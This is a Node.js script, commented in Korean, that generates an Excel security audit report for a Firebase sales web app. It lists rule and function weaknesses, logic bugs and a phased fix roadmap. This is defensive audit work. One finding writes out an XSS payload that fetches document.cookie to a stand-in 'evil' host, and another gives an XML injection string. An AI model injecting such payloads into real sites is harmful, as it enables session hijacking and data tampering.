// 보안 감사 리포트 Excel 생성기 (1회성)
// 실행: node _gen_security_audit.js
const path = require('path');
const ExcelJS = require(path.join(__dirname, 'functions', 'node_modules', 'exceljs'));

const OUT = path.join(__dirname, '보안감사_리포트_20260420.xlsx');

// ────────────────────────────────────────────────────────────────
// 데이터
// ────────────────────────────────────────────────────────────────
const findings = [
  // Critical
  { id: 'S-01', sev: 'Critical', cat: 'Firestore Rules',
    title: "products/ 쓰기 전원 허용",
    where: "firestore.rules:177-180",
    evidence: "allow write: if signedIn();  (누구나 상품 수정/삭제)",
    attack: "로그인만 하면 누구나 상품 가격·이름·단위 수정, 삭제 가능. 감사 로그(auditProducts)도 없음.",
    fix: "prod_reg / prod_approve 권한 보유자 + Office/Admin 만 write 허용. auditProducts Cloud Function 추가.",
    phase: 1 },

  { id: 'S-02', sev: 'Critical', cat: 'Cloud Functions',
    title: "Callable 4개에 인증 검사 누락 (Denial-of-Wallet)",
    where: "functions/index.js:254, 290, 344, 465",
    evidence: "getPttOilPrice / getPttMonthly / sendReceiptRequest / trackParcel — context.auth 체크 없음",
    attack: "직원 누구나 외부 API 쿼터 소진 가능. 특히 trackParcel 은 유료 Thaipost API. sendReceiptRequest 는 LINE 스팸 가능.",
    fix: "각 함수 맨 앞에 if (!context.auth) throw new HttpsError('unauthenticated'). 관리 전용은 _isAdminClaim() 체크까지 추가.",
    phase: 1 },

  { id: 'S-03', sev: 'Critical', cat: 'Cloud Functions',
    title: "인증 없는 HTTPS onRequest 5개 (CORS *)",
    where: "functions/index.js:812, 927, 1025, 1383, 1526",
    evidence: "testCustomerReport / rdVatLookup / dbdLookup / testDailySummary / backfillGeocode — 인터넷에서 누구나 호출 가능",
    attack: "testCustomerReport: Gmail 이메일 발송 스팸 + 쿼터 소진 + Firestore 더미 데이터 삽입(버그). testDailySummary: SYSTEM_BOT 사칭 채팅 발송. backfillGeocode: Maps 쿼터 소진(주석엔 token=SECRET 이라 써있지만 코드엔 없음).",
    fix: "테스트 함수는 프로덕션 배포 제외(firebase.json ignore). 운영 onRequest 는 Bearer 토큰 검증 또는 Firebase Auth ID 토큰 검증 추가. CORS 화이트리스트 적용.",
    phase: 1 },

  { id: 'S-04', sev: 'Critical', cat: 'Chat / Rules',
    title: "chats/ 전원 읽기/쓰기 + 송신자 사칭 가능",
    where: "firestore.rules:217-222, core.js:2189",
    evidence: "match /chats/{chatId} { allow read, write: if signedIn(); } — 클라이언트가 from 필드를 직접 채움",
    attack: "타인의 DM 전부 열람 가능. A가 B 명의로 메시지 작성해 관리자에게 전송 가능. SYSTEM_BOT 사칭도 가능.",
    fix: "규칙에 participants 배열 검사 추가: allow read,write: if signedIn() && request.auth.token.email.split('@')[0] in resource.data.participants. from 필드는 Cloud Function 경유로만 설정하거나 규칙에서 request.resource.data.from == myEmpid() 강제.",
    phase: 2 },

  { id: 'S-05', sev: 'Critical', cat: 'Rules',
    title: "notifications update 전원 허용 → 알림 가로채기",
    where: "firestore.rules:210",
    evidence: "allow update: if signedIn(); — 필드 제한 없음",
    attack: "공격자가 update 로 to/title/message 전부 덮어쓰기 가능. 미읽음 알림 수신자를 타인으로 변경·내용 위조.",
    fix: "필드 화이트리스트: allow update: if signedIn() && request.resource.data.diff(resource.data).affectedKeys().hasOnly(['read','readAt']).",
    phase: 2 },

  // High
  { id: 'S-06', sev: 'High', cat: 'Rules + Function',
    title: "attendanceNotify 생성 전원 허용 → FCM 스팸",
    where: "firestore.rules:104, functions/index.js:663",
    evidence: "allow create: if signedIn(); 필드 검증 없음. 자동으로 Office 팀 전원에 FCM push.",
    attack: "스크립트로 수백 건 생성 → Office 팀 단말기 알림 폭주.",
    fix: "규칙에 request.resource.data.senderEmpid == myEmpid() 강제 + 하루 생성 수 제한(Cloud Function 에서 체크).",
    phase: 2 },

  { id: 'S-07', sev: 'High', cat: 'Rules',
    title: "공용 컬렉션 6개 쓰기 전원 허용",
    where: "firestore.rules:161,164,192,195,198,201",
    evidence: "consignment_master, daily_reports, visit_logs, visit_schedules, addresses, address_history",
    attack: "담당자 검증 없음 → 타인 보고서/방문기록/주소 임의 조작·삭제 가능.",
    fix: "docId를 {empid}_{timestamp} 규약으로 통일 후 docId.matches('^'+myEmpid()+'_.*') prefix 검사. addresses 는 고객 담당자 검증.",
    phase: 2 },

  { id: 'S-08', sev: 'High', cat: 'XSS',
    title: "innerHTML 미이스케이프 (XSS 5곳)",
    where: "account.js:1428, extra.js:452-453, order.js:6703, chat.js:579, chat.js:942-943",
    evidence: "acct.name / n.title / n.message / product.model·spec·name / peerName / shortText — escHtml() 미적용",
    attack: "공격자가 notifications 에 <img src=x onerror=fetch('//evil/?'+document.cookie)> 주입 → 알림 목록 여는 피해자 세션 탈취. S-05·S-01 과 연계되면 더 심각.",
    fix: "order.js 에 이미 있는 escHtml(str) 을 공유 유틸로 옮기고 해당 5곳 모두 적용. 또는 textContent 로 전환.",
    phase: 2 },

  { id: 'S-09', sev: 'High', cat: 'Cloud Functions',
    title: "BOOTSTRAP_ADMIN_EMPID 하드코딩 영구 백도어",
    where: "functions/index.js:504",
    evidence: "const BOOTSTRAP_ADMIN_EMPID = \"T2408087\";  // 최초 1회용이지만 영구 남음",
    attack: "해당 계정 탈취 시 setAdminClaim 으로 전체 시스템 장악.",
    fix: "최초 1회 후 Firestore 에 bootstrapUsed=true flag 기록하고 두 번째 호출부턴 차단. 또는 env var 로 이관 후 초기 세팅 완료 시 제거.",
    phase: 3 },

  { id: 'S-10', sev: 'High', cat: 'Rules',
    title: "pendingCustomers 읽기 전원 허용 — 리드 탈취",
    where: "firestore.rules:154-159",
    evidence: "allow read: if signedIn(); — 타 영업의 신규 고객 제출분까지 전부 조회 가능",
    attack: "A가 B가 올린 신규 치과 리드를 먼저 확인하고 선수 방문.",
    fix: "allow read: if isAdmin() || isOffice() || resource.data.submitter == myEmpid(). 저장 시 submitter 필드 필수.",
    phase: 2 },

  { id: 'S-11', sev: 'High', cat: 'Rules',
    title: "고객 담당 재배정 허용 (sales 필드 동결 없음)",
    where: "firestore.rules:148-151",
    evidence: "update 규칙에 sales 필드 불변 조건 없음",
    attack: "A가 자기 고객을 B 명의로 넘기면 B가 해당 고객 열람·수정 가능. 역방향 공격(고객 가로채기)은 A가 request.resource.data.sales = 'A' 로 덮어쓰면 성립.",
    fix: "update 조건에 request.resource.data.sales == resource.data.sales 추가. 재배정은 Office/Admin 만.",
    phase: 2 },

  // Medium
  { id: 'S-12', sev: 'Medium', cat: 'Audit Log',
    title: "감사 로그 actor 가 항상 null",
    where: "functions/index.js:98, 클라이언트 전 경로",
    evidence: "auditCustomers 가 _last_modified_by 를 읽지만 클라이언트가 한 번도 이 필드를 안 씀",
    attack: "누가 언제 고객 정보를 바꿨는지 추적 불가. 사고 시 책임 규명 불가능.",
    fix: "customers/products 저장 시 클라이언트에서 _last_modified_by: user.empid, _last_modified_at: serverTimestamp() 를 항상 포함.",
    phase: 3 },

  { id: 'S-13', sev: 'Medium', cat: 'Rules / Privacy',
    title: "presence, sessions 읽기 전원 허용 → 위치/출퇴근 추적",
    where: "firestore.rules:55, 59",
    evidence: "allow read: if signedIn(); — 모든 직원의 마지막 로그인 시각/주소/디바이스",
    attack: "스토킹, 출퇴근 시간 추적, 외근 위치 노출.",
    fix: "필드 분리: online bool 은 공개용 presenceStatus/, 상세 타임스탬프/위치는 presence/ 로 분리하고 본인/Admin 만 읽기.",
    phase: 3 },

  { id: 'S-14', sev: 'Medium', cat: 'Rules',
    title: "announcements.readBy 조작 잠재",
    where: "firestore.rules:68",
    evidence: "현재 write: if isAdmin() 이라 직접 차단되지만, 읽음 마킹 경로가 불명확",
    attack: "차후 규칙 완화 시 A가 B 를 readBy 에 추가하면 B 가 공지를 '이미 읽음' 으로 오인.",
    fix: "readMarkers/{annId_empid} 별도 컬렉션으로 분리 — create if docId == annId+'_'+myEmpid().",
    phase: 3 },

  { id: 'S-15', sev: 'Medium', cat: 'Supply Chain',
    title: "3rd-party CDN 스크립트 SRI 미적용",
    where: "index.html, sw.js:11-31",
    evidence: "jsdelivr/cdnjs/gstatic 로드 시 integrity=\"sha384-...\" 속성 없음",
    attack: "CDN 변조·MITM 시 악성 JS 실행. SW 가 이를 Cache-First 로 영구 보관해 한 번 독성 버전 들어오면 장기간 남음.",
    fix: "각 <script src>, <link href> 에 integrity 해시 추가. 해시는 https://www.srihash.org 등에서 생성. 동시에 SW 는 응답 상태뿐 아니라 integrity 체크 후 캐싱.",
    phase: 3 },

  { id: 'S-16', sev: 'Medium', cat: 'Cloud Functions',
    title: "XML 인젝션 — rdVatLookup",
    where: "functions/index.js:940-953",
    evidence: "`<TIN>${tin}</TIN>` `<Name>${name}</Name>` — 이스케이프 없이 SOAP 본문 삽입",
    attack: "tin 에 \"></TIN><TIN>foo\" 주입으로 SOAP 파서 혼란 유도. 외부 서비스 응답 파싱 우회 가능.",
    fix: "xmlEscape(s) = s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;').replace(/'/g,'&apos;'). tin/name 에 적용.",
    phase: 3 },

  { id: 'S-17', sev: 'Medium', cat: 'Logic Bug',
    title: "adminResetUserPassword 가 없는 empid 에 유령 계정 생성",
    where: "functions/index.js:592-599",
    evidence: "if err.code === 'auth/user-not-found' → createUser() 실행. '리셋' 동작으로 보이지만 실제로는 '없으면 생성'.",
    attack: "관리자가 오타로 존재하지 않는 empid 입력 시 조용히 Auth 계정 생성됨. 계정 목록 무결성 훼손.",
    fix: "createUser 전에 accounts/{empid} 문서 존재 여부 검사. 없으면 invalid-argument 반환.",
    phase: 3 },

  { id: 'S-18', sev: 'Medium', cat: 'Info Leak',
    title: "lineWebhook 로그에 channelSecret 길이 노출",
    where: "functions/index.js:169",
    evidence: "console.log(\"[LINE Webhook] channelSecret length:\", LINE_CONFIG.channelSecret.length);",
    attack: "길이만으로는 공격 불가하지만 불필요한 시크릿 메타데이터 노출. Cloud Logging 접근자에게 유출.",
    fix: "디버그 완료됐으면 해당 console.log 제거.",
    phase: 3 },

  // Low
  { id: 'S-19', sev: 'Low', cat: 'Ops Hygiene',
    title: ".gitignore 부재 + 민감 파일 다수",
    where: "프로젝트 루트",
    evidence: "현재 .git 없음. 하지만 consignment_master.json, data_upload/, backup_20260409/, *.xlsx, deploy_log.txt, node_modules/ 등이 잠재 커밋 대상.",
    attack: "차후 git init 시 영업 데이터·백업이 실수로 원격 저장소에 푸시될 수 있음.",
    fix: ".gitignore 에 node_modules/, data_upload/, backup_*/, *.xlsx, *.json (consignment_master), deploy_log.txt, *.bat, *.ps1 등 추가.",
    phase: 3 },

  { id: 'S-20', sev: 'Low', cat: 'Privacy',
    title: "Cloud Logging 에 empid PII 평문 기록",
    where: "functions/index.js:361, 440, 658, 1457 등",
    evidence: "console.warn(\"[Receipt LINE] send fail:\", empid, ...) 등 다수",
    attack: "Cloud Logging 접근 가능한 개발자 전원에게 직원 활동 추적 가능.",
    fix: "PII 해시 함수 추가 후 로그에 empid 대신 hash(empid) 기록. 또는 로그 필드에 structured label 사용해 접근 제어.",
    phase: 3 },

  { id: 'S-21', sev: 'Low', cat: 'External',
    title: "Google Maps API 키 도메인 제한 확인 필요",
    where: "core.js / index.html (AIza...)",
    evidence: "클라이언트에 노출은 불가피하지만 GCP Console 의 HTTP referrers 제한 여부는 코드로 판정 불가",
    attack: "제한 미설정 시 타 도메인에서 키 탈취 후 Maps 쿼터 소진.",
    fix: "GCP Console → API 및 서비스 → 사용자 인증 정보 → Maps API 키 → Application restrictions = HTTP referrers, Website restrictions = neothai-order.web.app/* 로 설정.",
    phase: 4 },

  { id: 'S-22', sev: 'Low', cat: 'Service Worker',
    title: "SW Cache-First 가 opaque 응답도 캐싱 가능",
    where: "sw.js:88-90",
    evidence: "if (resp.ok) { cache.put(...) } — opaque response 는 ok=false 라 실제론 차단되지만, 3rd-party CDN 의 에러 응답을 성공으로 오해할 여지 있음.",
    attack: "현재로선 치명적이지 않음. integrity 체크 추가하면 방어됨.",
    fix: "resp.status === 200 명시적 체크 + Content-Length 검증 선택적 추가.",
    phase: 4 },
];

const bugs = [
  { id: 'B1', sev: 'High', title: "testCustomerReport 가 빈 컬렉션에 더미 데이터 INSERT",
    where: "functions/index.js:819-830",
    impact: "프로덕션 Firestore customerChangelog 에 테스트 데이터 삽입 후 이메일 발송. 운영 데이터 오염 + 실제 수신자에게 스팸.",
    fix: "if (snap.empty) 분기 제거 또는 '테스트' 환경에서만 동작하도록 ENV 체크." },

  { id: 'B2', sev: 'High', title: "backfillGeocode 주석엔 token=SECRET 이라는데 코드에 검증 없음",
    where: "functions/index.js:1522 주석 vs 1529~ 본문",
    impact: "False sense of security. 실제로는 전 세계 누구나 호출 가능.",
    fix: "const expected = process.env.BACKFILL_TOKEN; if (req.query.token !== expected) return res.status(403)." },

  { id: 'B3', sev: 'Medium', title: "adminResetUserPassword 가 없는 empid 에 조용히 유령 계정 생성",
    where: "functions/index.js:592-599",
    impact: "리셋 의도와 다르게 동작. 오타로 인한 데이터 무결성 훼손. accounts 문서 없는 Auth 계정이 떠돌게 됨.",
    fix: "createUser 전에 db.collection('accounts').doc(empid).get() 으로 존재 확인. 없으면 invalid-argument." },

  { id: 'B4', sev: 'Low', title: "lineWebhook 에 channelSecret.length 디버그 로깅 잔존",
    where: "functions/index.js:169",
    impact: "프로덕션 Cloud Logging 에 시크릿 메타데이터 노출.",
    fix: "console.log 제거." },

  { id: 'B5', sev: 'Medium', title: "감사 로그 actor 가 실질적으로 늘 null",
    where: "functions/index.js:98 (읽기 로직) vs 클라이언트 (쓰기 누락)",
    impact: "auditLogs 가 동작은 하지만 '누가 바꿨는지' 가 전부 비어있음.",
    fix: "고객/상품 쓰기 전 경로에서 _last_modified_by, _last_modified_at 필수 기입." },

  { id: 'B6', sev: 'Low', title: "SW 에 Cache-First 로 CDN 스크립트 영구 보관",
    where: "sw.js:82-97",
    impact: "CDN 측에서 라이브러리 긴급 보안 패치가 나와도 유저 단말기에는 기존 버전이 계속 서빙됨.",
    fix: "CDN 자산은 CACHE_VERSION 변경 시만 refresh. 긴급 교체가 필요하면 CACHE_VERSION 범프 후 배포." },
];

const actions = [
  // Phase 1 — 24시간 내
  { phase: 'Phase 1 (24h)', priority: 1, target: "S-03 테스트 HTTPS 엔드포인트 삭제 또는 인증 추가", who: "functions/index.js", est: "30분" },
  { phase: 'Phase 1 (24h)', priority: 2, target: "S-02 Callable 4개에 context.auth 체크 추가", who: "functions/index.js:254,290,344,465", est: "20분" },
  { phase: 'Phase 1 (24h)', priority: 3, target: "S-01 products/ 규칙 잠금 + auditProducts 함수 추가", who: "firestore.rules, functions/index.js", est: "1시간" },

  // Phase 2 — 1주 내
  { phase: 'Phase 2 (1w)', priority: 4, target: "S-04 chats/ participants 기반 제한", who: "firestore.rules, chat.js", est: "2시간" },
  { phase: 'Phase 2 (1w)', priority: 5, target: "S-05 notifications update 필드 화이트리스트", who: "firestore.rules", est: "15분" },
  { phase: 'Phase 2 (1w)', priority: 6, target: "S-06 attendanceNotify senderEmpid 검증", who: "firestore.rules, attendance.js", est: "30분" },
  { phase: 'Phase 2 (1w)', priority: 7, target: "S-08 XSS 패치 5곳 escHtml 적용", who: "account.js, extra.js, order.js, chat.js", est: "1시간" },
  { phase: 'Phase 2 (1w)', priority: 8, target: "S-07 공용 컬렉션 6개 docId prefix 규약", who: "firestore.rules + 각 쓰기 경로", est: "3시간" },
  { phase: 'Phase 2 (1w)', priority: 9, target: "S-10 pendingCustomers submitter 기반 읽기 제한", who: "firestore.rules, customer.js", est: "30분" },
  { phase: 'Phase 2 (1w)', priority: 10, target: "S-11 고객 sales 필드 동결", who: "firestore.rules", est: "15분" },

  // Phase 3 — 2주 내
  { phase: 'Phase 3 (2w)', priority: 11, target: "S-12 _last_modified_by 클라이언트 삽입", who: "customer.js, order.js 외 쓰기 경로", est: "1시간" },
  { phase: 'Phase 3 (2w)', priority: 12, target: "S-13 presence 필드 분리(공개/비공개)", who: "firestore.rules, extra.js", est: "1.5시간" },
  { phase: 'Phase 3 (2w)', priority: 13, target: "S-15 CDN 스크립트 SRI 해시 추가", who: "index.html", est: "30분" },
  { phase: 'Phase 3 (2w)', priority: 14, target: "S-09 BOOTSTRAP_ADMIN 1회성 가드", who: "functions/index.js", est: "20분" },
  { phase: 'Phase 3 (2w)', priority: 15, target: "버그 B1~B5 수정", who: "functions/index.js", est: "1시간" },
  { phase: 'Phase 3 (2w)', priority: 16, target: "S-19 .gitignore 추가", who: ".gitignore", est: "5분" },

  // Phase 4 — 선택
  { phase: 'Phase 4 (선택)', priority: 17, target: "S-21 GCP Maps API 키 referrer 제한 확인", who: "GCP Console (코드 외)", est: "5분" },
  { phase: 'Phase 4 (선택)', priority: 18, target: "S-16 rdVatLookup XML 이스케이프", who: "functions/index.js:940", est: "15분" },
  { phase: 'Phase 4 (선택)', priority: 19, target: "S-20 Cloud Logging PII 마스킹", who: "functions/index.js 전반", est: "30분" },
];

// ────────────────────────────────────────────────────────────────
// 엑셀 생성
// ────────────────────────────────────────────────────────────────
(async () => {
  const wb = new ExcelJS.Workbook();
  wb.creator = 'Security Audit';
  wb.created = new Date();

  const sevColor = {
    Critical: 'FFDC2626',
    High:     'FFEA580C',
    Medium:   'FFCA8A04',
    Low:      'FF16A34A',
  };
  const sevFont = { color: { argb: 'FFFFFFFF' }, bold: true };
  const hdrFill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FF1E293B' } };
  const hdrFont = { color: { argb: 'FFFFFFFF' }, bold: true, size: 11 };
  const wrapAlign = { vertical: 'top', wrapText: true };

  function styleHeader(ws) {
    const row = ws.getRow(1);
    row.height = 24;
    row.eachCell(c => {
      c.fill = hdrFill;
      c.font = hdrFont;
      c.alignment = { vertical: 'middle', horizontal: 'center', wrapText: true };
      c.border = { bottom: { style: 'medium', color: { argb: 'FF1E293B' } } };
    });
    ws.views = [{ state: 'frozen', ySplit: 1 }];
  }

  function sevCell(cell, sev) {
    cell.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: sevColor[sev] || 'FF64748B' } };
    cell.font = sevFont;
    cell.alignment = { vertical: 'middle', horizontal: 'center' };
  }

  function applyBorders(ws) {
    const lastRow = ws.rowCount;
    const lastCol = ws.columnCount;
    for (let r = 1; r <= lastRow; r++) {
      for (let c = 1; c <= lastCol; c++) {
        const cell = ws.getCell(r, c);
        cell.border = Object.assign({}, cell.border, {
          top: { style: 'thin', color: { argb: 'FFE5E7EB' } },
          left: { style: 'thin', color: { argb: 'FFE5E7EB' } },
          right: { style: 'thin', color: { argb: 'FFE5E7EB' } },
          bottom: { style: 'thin', color: { argb: 'FFE5E7EB' } },
        });
      }
    }
  }

  // ── Sheet 1: 요약 ──
  const wsSum = wb.addWorksheet('요약', { views: [{ showGridLines: false }] });
  wsSum.columns = [
    { header: '항목', key: 'k', width: 28 },
    { header: '값',   key: 'v', width: 60 },
  ];
  styleHeader(wsSum);

  const counts = { Critical: 0, High: 0, Medium: 0, Low: 0 };
  findings.forEach(f => counts[f.sev]++);

  const summaryRows = [
    { k: '감사 일자', v: '2026-04-20' },
    { k: '대상 프로젝트', v: 'Neo Sales App (neothai-order.web.app)' },
    { k: '감사 범위', v: 'firestore.rules, storage.rules, functions/index.js, 클라이언트 JS (core/customer/chat/order/extra/account 등)' },
    { k: '총 발견 건수', v: findings.length + '건 (보안) + ' + bugs.length + '건 (버그)' },
    { k: '🔴 Critical', v: counts.Critical + '건' },
    { k: '🟠 High', v: counts.High + '건' },
    { k: '🟡 Medium', v: counts.Medium + '건' },
    { k: '🟢 Low', v: counts.Low + '건' },
    { k: '', v: '' },
    { k: '핵심 결론', v: '고객 쪽 규칙은 비교적 양호하나, 상품(products)·채팅(chats)·알림(notifications)·공용 보고서 컬렉션이 "로그인만 하면 누구나 쓰기" 상태. Cloud Functions 에 인증 없는 Callable/onRequest 다수. XSS·XML 인젝션 잠재 경로 6건.' },
    { k: '권장 진행', v: 'Phase 1 (24시간 내 Critical 3건) → Phase 2 (1주 내 High/XSS) → Phase 3 (2주 내 나머지) 순.' },
  ];
  summaryRows.forEach(r => wsSum.addRow(r));
  wsSum.getColumn('k').font = { bold: true };
  wsSum.eachRow((row, i) => { if (i > 1) row.alignment = wrapAlign; });
  applyBorders(wsSum);

  // ── Sheet 2: 보안 발견 ──
  const wsF = wb.addWorksheet('보안 발견', { views: [{ state: 'frozen', ySplit: 1, showGridLines: false }] });
  wsF.columns = [
    { header: 'ID',        key: 'id',       width: 8 },
    { header: '심각도',    key: 'sev',      width: 10 },
    { header: '분류',      key: 'cat',      width: 16 },
    { header: '제목',      key: 'title',    width: 45 },
    { header: '위치',      key: 'where',    width: 35 },
    { header: '증거',      key: 'evidence', width: 55 },
    { header: '공격 시나리오', key: 'attack', width: 55 },
    { header: '제안 조치', key: 'fix',      width: 55 },
    { header: 'Phase',     key: 'phase',    width: 8 },
  ];
  styleHeader(wsF);
  findings.forEach(f => {
    const row = wsF.addRow(f);
    sevCell(row.getCell('sev'), f.sev);
    row.alignment = wrapAlign;
    row.getCell('id').font = { bold: true };
    row.height = Math.max(40, Math.min(160,
      Math.ceil(Math.max(f.evidence.length, f.attack.length, f.fix.length) / 50) * 18));
  });
  // auto filter
  wsF.autoFilter = { from: { row: 1, column: 1 }, to: { row: 1, column: 9 } };
  applyBorders(wsF);

  // ── Sheet 3: 버그 ──
  const wsB = wb.addWorksheet('로직 버그', { views: [{ state: 'frozen', ySplit: 1, showGridLines: false }] });
  wsB.columns = [
    { header: 'ID',     key: 'id',     width: 8 },
    { header: '심각도', key: 'sev',    width: 10 },
    { header: '제목',   key: 'title',  width: 55 },
    { header: '위치',   key: 'where',  width: 35 },
    { header: '영향',   key: 'impact', width: 60 },
    { header: '수정안', key: 'fix',    width: 60 },
  ];
  styleHeader(wsB);
  bugs.forEach(b => {
    const row = wsB.addRow(b);
    sevCell(row.getCell('sev'), b.sev);
    row.alignment = wrapAlign;
    row.getCell('id').font = { bold: true };
    row.height = Math.max(40, Math.min(140,
      Math.ceil(Math.max(b.impact.length, b.fix.length) / 50) * 18));
  });
  wsB.autoFilter = { from: { row: 1, column: 1 }, to: { row: 1, column: 6 } };
  applyBorders(wsB);

  // ── Sheet 4: 조치 로드맵 ──
  const wsA = wb.addWorksheet('조치 로드맵', { views: [{ state: 'frozen', ySplit: 1, showGridLines: false }] });
  wsA.columns = [
    { header: 'Phase',   key: 'phase',    width: 16 },
    { header: '우선순위', key: 'priority', width: 10 },
    { header: '조치',    key: 'target',   width: 55 },
    { header: '대상 파일', key: 'who',     width: 40 },
    { header: '예상 시간', key: 'est',     width: 12 },
    { header: '완료', key: 'done',     width: 8 },
  ];
  styleHeader(wsA);
  actions.forEach(a => {
    const row = wsA.addRow(Object.assign({ done: '' }, a));
    row.alignment = wrapAlign;
    row.getCell('priority').alignment = { vertical: 'middle', horizontal: 'center' };
    row.getCell('done').alignment = { vertical: 'middle', horizontal: 'center' };
    // Phase 색상
    const p = row.getCell('phase');
    if (a.phase.startsWith('Phase 1')) p.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FFFEE2E2' } };
    else if (a.phase.startsWith('Phase 2')) p.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FFFED7AA' } };
    else if (a.phase.startsWith('Phase 3')) p.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FFFEF3C7' } };
    else p.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FFDCFCE7' } };
    p.font = { bold: true };
    row.height = 30;
  });
  wsA.autoFilter = { from: { row: 1, column: 1 }, to: { row: 1, column: 6 } };
  applyBorders(wsA);

  // ── Sheet 5: 심각도 범례 ──
  const wsL = wb.addWorksheet('심각도 범례', { views: [{ showGridLines: false }] });
  wsL.columns = [
    { header: '심각도', key: 'sev',   width: 14 },
    { header: '의미',   key: 'desc',  width: 70 },
    { header: '예시',   key: 'ex',    width: 60 },
  ];
  styleHeader(wsL);
  const legend = [
    { sev: 'Critical', desc: '즉시(24시간 내) 조치 필요. 서비스 전체·금전·데이터 무결성에 직접 피해.', ex: 'Callable/onRequest 인증 누락, products 전원 쓰기, 채팅 사칭' },
    { sev: 'High',     desc: '1주 내 조치 권장. 개별 사용자·팀 단위 피해 또는 XSS 등 공격 체인 핵심 고리.', ex: 'XSS, FCM 스팸, 담당자 우회, 리드 탈취' },
    { sev: 'Medium',   desc: '2주 내 조치 권장. 감사·프라이버시·안정성 약화. 단독으론 제한적.', ex: '감사 actor 누락, 위치 추적 가능, XML 인젝션' },
    { sev: 'Low',      desc: '기회될 때 정리. 방어 심층화(defense-in-depth) 수준.', ex: '.gitignore, PII 로깅, SRI' },
  ];
  legend.forEach(r => {
    const row = wsL.addRow(r);
    sevCell(row.getCell('sev'), r.sev);
    row.alignment = wrapAlign;
    row.height = 40;
  });
  applyBorders(wsL);

  await wb.xlsx.writeFile(OUT);
  console.log('[OK] ' + OUT);
})().catch(e => { console.error(e); process.exit(1); });
